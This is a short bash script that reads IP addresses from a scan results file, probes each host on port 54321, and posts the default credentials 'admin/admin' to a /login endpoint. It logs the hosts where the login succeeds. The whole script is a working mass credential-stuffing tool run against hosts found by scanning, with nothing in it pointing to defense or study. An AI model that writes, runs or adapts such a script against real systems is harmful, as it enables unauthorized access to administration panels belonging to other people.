#!/bin/bash

while IFS= read -r ip_ad; do
    if timeout 30 curl -sSf --max-time 30 "http://${ip_ad}:54321" >/dev/null; then
        res=$(timeout 30 curl -sSf --max-time 30 "http://${ip_ad}:54321/login" --data-raw 'username=admin&password=admin' --compressed --insecure)
        if [[ "$res" =~ .*true.* ]]; then
            echo "$ip_ad" >>week.log
        fi
        echo "$ip_ad" >>all.log
    fi
done < <(sed -nE 's/.*"ip": "([^"]+)".*/\1/p' scan.json)
